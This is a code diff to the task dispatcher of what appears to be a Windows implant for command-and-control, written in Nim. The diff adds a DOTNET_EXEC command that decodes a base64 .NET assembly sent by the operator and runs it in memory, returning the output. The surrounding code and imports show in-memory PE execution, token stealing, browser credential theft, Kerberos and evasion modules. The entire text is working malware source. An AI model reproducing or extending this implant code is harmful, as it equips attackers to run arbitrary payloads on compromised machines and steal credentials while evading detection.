@@ -1,7 +1,7 @@
 ## Command dispatcher for Nim agent.
 import winim/lean, winim/inc/tlhelp32
-import std/[os, osproc, strutils, strformat, json, random, base64]
-import config, transport, evasion, kerberos, pe_exec, browsercreds
+import std/[os, osproc, strutils, strformat, json, random, base64, sequtils]
+import config, transport, evasion, kerberos, pe_exec, browsercreds, dotnet
 
 var sleepSecDyn* = SleepSec
 var jitterDyn*   = JitterPct
@@ -907,6 +907,16 @@ proc dispatchTask*(t: var AgentTransport; id: int64; typ, args: string; payload:
       let r = execPE(payload)
       t.sendResult(id, r, "")
     except: t.sendResult(id, "", "pe_exec: " & getCurrentExceptionMsg())
+  of "DOTNET_EXEC":
+    try:
+      let j = parseJson(args)
+      let b64 = j{"asm"}.getStr()
+      if b64.len == 0: t.sendResult(id, "", "DOTNET_EXEC: missing asm field"); return
+      let asmStr = base64.decode(b64)
+      let asmArgs = j{"args"}.getStr()
+      let r = execDotNet(asmStr.toOpenArrayByte(0, asmStr.high), asmArgs)
+      t.sendResult(id, r, "")
+    except: t.sendResult(id, "", "dotnet_exec: " & getCurrentExceptionMsg())
   of "TOKEN_STEAL":
     try:
       let pid = parseJson(args){"pid"}.getInt(0)
